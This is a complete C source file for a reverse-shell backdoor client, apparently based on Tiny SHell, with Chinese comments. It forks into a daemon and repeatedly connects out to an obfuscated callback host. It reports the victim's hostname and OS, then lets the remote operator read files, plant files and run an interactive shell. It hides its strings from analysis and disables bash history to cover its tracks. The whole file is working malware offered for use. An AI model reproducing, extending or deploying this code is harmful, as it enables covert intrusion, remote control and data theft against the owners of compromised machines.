#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/utsname.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>

/* PTY 伪终端条件编译 */
#if defined LINUX
  #include <pty.h>
#else
#if defined FREEBSD
  #include <libutil.h>
#endif
#endif

#include "client.obf.h"
#include "../crypto/protocol/pel.h"

unsigned char message[FILE_BUFSIZE + 1];

static struct pel_context send_ctx;
static struct pel_context recv_ctx;
static unsigned char pel_buffer[PEL_BUFFER_SIZE];

int daemon_create();
int ksh_server();
int process_client( int client );
int ksh_get_file( int client );
int ksh_put_file( int client );
int ksh_runshell( int client );

int main( int argc, char **argv )
{
    (void)argc;
    (void)argv;

    STACK_NOISE();

    daemon_create();
    ksh_server();
    return( 13 );
}

int daemon_create()
{
    pid_t pid;

    pid = fork();
    if (pid < 0) return 1;
    if (pid > 0) exit(0);

    if (setsid() < 0) return 2;

    pid = fork();
    if (pid < 0) return 3;
    if (pid > 0) exit(0);

    umask(0);
    if (chdir("/") < 0) {
        /* chdir failed, but we continue anyway as it's not critical */
    }

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        for (int i = 0; i < (int)rl.rlim_max; i++) {
            close(i);
        }
    }

    return 0;
}
int ksh_server()
{
    int ret;
    int client_fd;
    struct sockaddr_in client_addr;

    char *cb_host = CB_HOST_OBF();
    int server_port = DEOBF_PORT(SERVER_PORT_OBF());

    while( 1 )
    {
        sleep( CONNECT_BACK_DELAY );

        client_fd = socket( AF_INET, SOCK_STREAM, 0 );

        if( client_fd < 0 )
        {
            close(client_fd);
            continue;
        }

        struct addrinfo hints, *result;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        int gai_ret = getaddrinfo(cb_host, NULL, &hints, &result);
        if (gai_ret != 0) {
            continue;
        }

        struct sockaddr_in *addr_in = (struct sockaddr_in *)result->ai_addr;
        memcpy(&client_addr.sin_addr, &addr_in->sin_addr, sizeof(struct in_addr));
        freeaddrinfo(result);

        client_addr.sin_family = AF_INET;
        client_addr.sin_port   = htons( server_port );

        ret = connect( client_fd, (struct sockaddr *) &client_addr, sizeof( client_addr ) );

        if( ret < 0 )
        {
            close( client_fd );
            continue;
        }

        ret = process_client(client_fd);
        close(client_fd);

        if (ret == 1) {
            continue;
        }

        continue;
	} 
}
int process_client(int client) {

	int pid, ret, len;

    char *secret = SECRET_OBF();

    /* fork a child to handle the connection */

    pid = fork();

    if( pid < 0 )
    {
        close( client );
        return 1;
    }

    if( pid != 0 )
    {
        int status;
        waitpid( pid, &status, 0 );
        close( client );
    	return 1;
    }

    alarm( 3 );

    ret = pel_client_init( client, secret, &send_ctx, &recv_ctx );

    if( ret != PEL_SUCCESS )
    {
		shutdown( client, 2 );
		close( client );
    	exit( 10 );
    }

    alarm( 0 );
    STACK_NOISE();

    /* 发送hostname给服务器 */
    char hostname[64];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        int len = strlen(hostname);
        ret = pel_send_msg(client, (unsigned char*)hostname, len, &send_ctx, pel_buffer);
    } else {
        char *unknown = UNKNOWN_HOST_OBF();
        ret = pel_send_msg(client, (unsigned char*)unknown, strlen(unknown), &send_ctx, pel_buffer);
    }

    if (ret != PEL_SUCCESS) {
        shutdown(client, 2);
        close(client);
        exit(10);
    }

    /* 发送OS信息给服务器 */
    struct utsname un;
    char os_info[256];
    if (uname(&un) == 0) {
        char *fmt = OS_INFO_FORMAT_OBF();
        snprintf(os_info, sizeof(os_info), fmt, un.sysname, un.release);
        ret = pel_send_msg(client, (unsigned char*)os_info, strlen(os_info), &send_ctx, pel_buffer);
    } else {
        char *unknown = UNKNOWN_HOST_OBF();
        ret = pel_send_msg(client, (unsigned char*)unknown, strlen(unknown), &send_ctx, pel_buffer);
    }

    if (ret != PEL_SUCCESS) {
        shutdown(client, 2);
        close(client);
        exit(10);
    }

    /* 主循环，等待服务器命令 */
    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

        if( ret != PEL_SUCCESS || len != 1 )
        {
            shutdown( client, 2 );
            close( client );
            exit( 11 );  // 子进程退出，父进程会检测到并重新连接
        }

        STACK_NOISE();

        switch( message[0] )
        {
            case GET_FILE:

                ret = ksh_get_file( client );
                break;

            case PUT_FILE:

                ret = ksh_put_file( client );
                break;

            case RUNSHELL:

                ret = ksh_runshell( client );
                break;

            default:

                ret = 12;
                break;
        }

        /* 检查命令执行结果，只在通信错误时退出，业务错误继续运行 */
        /* GET_FILE: 14(通信错误), 16-18(业务错误或成功) */
        /* PUT_FILE: 19(通信错误), 20-23(业务错误或成功) */
        /* RUNSHELL: 24-55(各种错误或成功) */
        /* 只有通信层面的严重错误才需要重连 */
        if (ret == 14 || ret == 17 || ret == 19 || ret == 21 ||
            ret == 50 || ret == 52 || ret == 53) {
            shutdown( client, 2 );
            close( client );
            exit( ret );
        }
        /* 其他错误（如文件不存在、权限不足等）不断开连接 */
    }

    /* 如果循环退出（不应该发生），清理并退出子进程 */
    shutdown( client, 2 );
    close( client );
    exit( 0 );
}

int ksh_get_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

    if( ret != PEL_SUCCESS )
    {
        return( 14 );
    }

    message[len] = '\0';

    /* open local file */

    fd = open( (char *) message, O_RDONLY );

    if( fd < 0 )
    {
        char *error_msg = ERR_CANNOT_OPEN_FILE_OBF();
        pel_send_msg( client, (unsigned char*)error_msg, strlen(error_msg), &send_ctx, pel_buffer );
        return( 18 );  /* 返回正常值，避免客户端立即断开连接 */
    }

    /* send the data */

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len == 0 ) {
            close(fd);
            message[0] = '\0';
            pel_send_msg( client, message, 1, &send_ctx, pel_buffer );
            break;
        }

        if( len < 0 )
        {
            close(fd);
            return( 16 );
        }

        ret = pel_send_msg( client, message, len, &send_ctx, pel_buffer );

        if( ret != PEL_SUCCESS )
        {
            close(fd);
            return( 17 );
        }

        STACK_NOISE();
    }

    return( 18 );
}

int ksh_put_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

    if( ret != PEL_SUCCESS )
    {
        return( 19 );
    }

    message[len] = '\0';

    /* create local file */

    fd = creat( (char *) message, 0644 );

    if( fd < 0 )
    {
        return( 20 );
    }

    /* fetch the data */

    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED )
            {
                break;
            }

            return( 21 );
        }

        if( len == 1 && message[0] == '\0' )
        {
            break;
        }

        if( write( fd, message, len ) != len )
        {
            return( 22 );
        }

        STACK_NOISE();
    }

    close(fd);
    return( 23 );
}

int ksh_runshell( int client )
{
    fd_set rd;
    struct winsize ws;
    char *slave, *temp, *shell;
    int ret, len, pid, pty, tty, n;

    if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
    {
        return( 24 );
    }

    slave = ttyname( tty );

    if( slave == NULL )
    {
        return( 25 );
    }

    temp = (char *) malloc( 10 );

    if( temp == NULL )
    {
        return( 36 );
    }

    /* putenv("HISTFILE=/dev/null"); 禁止 bash 记录历史 */
    temp[0] = 'H'; temp[5] = 'I';
    temp[1] = 'I'; temp[6] = 'L';
    temp[2] = 'S'; temp[7] = 'E';
    temp[3] = 'T'; temp[8] = '=';
    temp[4] = 'F'; temp[9] = '\0';

    putenv( temp );

    ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

    if( ret != PEL_SUCCESS )
    {
        return( 37 );
    }

    message[len] = '\0';

    temp = (char *) malloc( len + 6 );

    if( temp == NULL )
    {
        return( 38 );
    }

    /* putenv("TERM=xterm"); 设置传入终端类型*/
    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';

    strncpy( temp + 5, (char *) message, len + 1 );

    putenv( temp );

    ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

    if( ret != PEL_SUCCESS || len != 4 )
    {
        return( 39 );
    }

    ws.ws_row = ( (int) message[0] << 8 ) + (int) message[1];
    ws.ws_col = ( (int) message[2] << 8 ) + (int) message[3];

    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    if( ioctl( pty, TIOCSWINSZ, &ws ) < 0 )
    {
        return( 40 );
    }

    ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

    if( ret != PEL_SUCCESS )
    {
        return( 41 );
    }

    message[len] = '\0';

    temp = (char *) malloc( len + 1 );

    if( temp == NULL )
    {
        return( 42 );
    }

    strncpy( temp, (char *) message, len + 1 );

    pid = fork();

    if( pid < 0 )
    {
        return( 43 );
    }

    if( pid == 0 )
    {
        /* close the client socket and the pty (master side) */

        close( client );
        close( pty );

        /* create a new session */

        if( setsid() < 0 )
        {
            return( 44 );
        }

        /* set controlling tty, to have job control */

        if( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
        {
            return( 45 );
        }

        /* tty becomes stdin, stdout, stderr */

        dup2( tty, 0 );
        dup2( tty, 1 );
        dup2( tty, 2 );

        if( tty > 2 )
        {
            close( tty );
        }

        /* fire up the shell */

        shell = (char *) malloc( 8 );

        if( shell == NULL )
        {
            return( 47 );
        }

        shell[0] = '/'; shell[4] = '/';
        shell[1] = 'b'; shell[5] = 's';
        shell[2] = 'i'; shell[6] = 'h';
        shell[3] = 'n'; shell[7] = '\0';

        execl( shell, shell + 5, "-c", temp, (char *) 0 );

        return( 48 );
    }
    else
    {
        /* tty (slave side) not needed anymore */

        close( tty );

        /* forward the data back and forth */

        while( 1 )
        {
            FD_ZERO( &rd );
            FD_SET( client, &rd );
            FD_SET( pty, &rd );

            n = ( pty > client ) ? pty : client;

            if( select( n + 1, &rd, NULL, NULL, NULL ) < 0 )
            {
                return( 49 );
            }

            if( FD_ISSET( client, &rd ) )
            {
                ret = pel_recv_msg( client, message, &len, &recv_ctx, pel_buffer );

                if( ret != PEL_SUCCESS )
                {
                    return( 50 );
                }

                if( write( pty, message, len ) != len )
                {
                    return( 51 );
                }

                STACK_NOISE();
            }

            if( FD_ISSET( pty, &rd ) )
            {
                len = read( pty, message, BUFSIZE );

                if( len == 0 ) {
                    message[0] = '\0';
                    ret = pel_send_msg( client, message, 1, &send_ctx, pel_buffer );
                    if( ret != PEL_SUCCESS )
                    {
                        return( 53 );
                    }
                    break;
                }

                if( len < 0 )
                {
                    return( 52 );
                }

                ret = pel_send_msg( client, message, len, &send_ctx, pel_buffer );

                if( ret != PEL_SUCCESS )
                {
                    return( 53 );
                }

                STACK_NOISE();
            }
        }
        close(pty);
        wait(NULL);

        return( 55 );
    }

    return( 55 );
}
